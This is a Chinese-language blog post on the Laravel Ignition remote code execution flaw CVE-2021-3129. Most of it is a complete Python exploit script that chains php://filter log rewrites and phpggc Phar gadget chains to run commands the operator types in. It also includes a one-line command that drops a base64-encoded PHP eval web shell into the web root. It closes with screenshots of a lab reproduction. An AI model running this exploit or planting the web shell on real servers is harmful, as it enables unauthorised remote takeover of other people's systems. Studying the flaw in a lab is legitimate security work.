# Laravel命令执行漏洞(编号CVE-2021-3129)

## 一、漏洞概述

Laravel基于php搭建的开发框架

### 漏洞原因

当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对[file_get_contents](https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020)()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

### 影响版本

Laravel <= 8.4.2

## 二、漏洞利用

github的一处exphttps://github.com/zhzyker/CVE-2021-3129/blob/main/exp.py

这里exp可以进行命令执行，但是作者把命令写死，可能使用会不便

这里笔者作了简单的调整

```python
# -*- coding=utf-8 -*-
# Author : Crispr
# Alter: zhzyker
import os
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
# __gadget_chains = {
#             # "Laravel/RCE1":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE2":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE3":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE4":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Laravel/RCE5":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """.format(command),
#             # "Laravel/RCE6":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """.format(command),
#             # "Laravel/RCE7":r"""
#             # php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             "Monolog/RCE1":r"""
#             php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             """,
#             # "Monolog/RCE2":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Monolog/RCE3":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#             # "Monolog/RCE4":r"""
#             # php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
#             # """,
#     }
class EXP:
    #这里还可以增加phpggc的使用链，经过测试发现RCE5可以使用  
    def __init__(self, target,__gadget_chains):
        self.__gadget_chains = __gadget_chains
        self.target = target
        self.__url = requests.compat.urljoin(target, "_ignition/execute-solution")
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()


    def __vul_check(self):
        res = requests.get(self.__url,verify=False)
        if res.status_code != 405 and "laravel" not in res.text:
            print("[+]Vulnerability does not exist")
            return False
        return True

    def __payload_send(self,payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        
        #print(data)
        res = requests.post(self.__url, headers=header, json=data, verify=False)
        return res

    def __clear_log(self):
        payload = "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        return self.__payload_send(payload=payload)

    def __generate_payload(self,gadget_chain):
        generate_exp = self.__gadget_chains[gadget_chain]
        #print(generate_exp)
        exp = "".join(os.popen(generate_exp).readlines()).replace("\n","")+ 'a'
        print("[+]exploit:")
        #print(exp)
        return exp

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar://../storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = str(self.__unserialize_log().text)
        #print(text)
        text = text[text.index(']'):].replace("}","").replace("]","")
        return text

    def exp(self):
        for gadget_chain in self.__gadget_chains.keys():
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            self.__clear_log()
            self.__clear_log()
            self.__payload_send('A' * 2)
            self.__payload_send(self.__generate_payload((gadget_chain)))
            self.__decode_log()
            print("[*] " + gadget_chain + " Result:")
            print(self.__rce())
            wait = input("等待....")

def main():
    url = input("input your url:")
    
    while True:
        command = input("input your command:")
        __gadget_chains = {
            # "Laravel/RCE1":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE2":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE3":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE4":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE4 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Laravel/RCE5":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """.format(command),
            # "Laravel/RCE6":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE6 "system({});" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """.format(command),
            # "Laravel/RCE7":r"""
            # php -d "phar.readonly=0" ./phpggc Laravel/RCE7 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            "Monolog/RCE1":r"""
            php -d "phar.readonly=0" ./phpggc Monolog/RCE1 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            """,
            # "Monolog/RCE2":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE2 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Monolog/RCE3":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE3 system """ + command + """ --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
            # "Monolog/RCE4":r"""
            # php -d "phar.readonly=0" ./phpggc Monolog/RCE4 id --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex (ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
            # """,
    }
        
        EXP(url,__gadget_chains)

if __name__ == "__main__":
    main()
```

这里记住，要在下载的目录下，运行脚本

同时可以利用下面命令写马

```php
'echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php'
```

### 复现

环境红日7靶场

![image-20231205152945712](http://111.229.225.13:81/i/2023/12/12/w4htev-2.png)

![image-20231205154238820](http://111.229.225.13:81/i/2023/12/12/w4ujvr-2.png)

![image-20231212194340619](http://111.229.225.13:81/i/2023/12/12/w51eer-2.png)

![image-20231212194352631](http://111.229.225.13:81/i/2023/12/12/w54an1-2.png)